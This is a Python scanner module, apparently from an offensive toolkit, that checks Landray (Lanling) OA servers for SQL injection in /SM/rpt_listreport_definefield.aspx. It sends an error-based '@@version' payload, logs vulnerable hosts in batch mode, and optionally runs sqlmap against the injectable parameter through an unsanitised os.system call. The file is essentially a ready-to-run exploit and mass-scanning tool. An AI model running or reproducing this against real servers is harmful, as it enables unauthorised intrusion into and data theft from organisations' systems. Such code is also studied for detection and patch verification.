#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Lanling_Sql_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "Microsoft" in req.text:
                OutPrintInfoSuc("Lanling", f'目标存在SQL漏洞: {url}')
                if self.batch:
                    OutPutFile("lanling_sql.txt",f'目标存在SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Lanling", f'目标不存在SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Lanling",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Lanling", '开始检测SQL漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测",choices=["y","n"])
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/SM/rpt_listreport_definefield.aspx?ID=2" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/SM/rpt_listreport_definefield.aspx?ID=2\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Lanling", 'SQL漏洞检测结束')


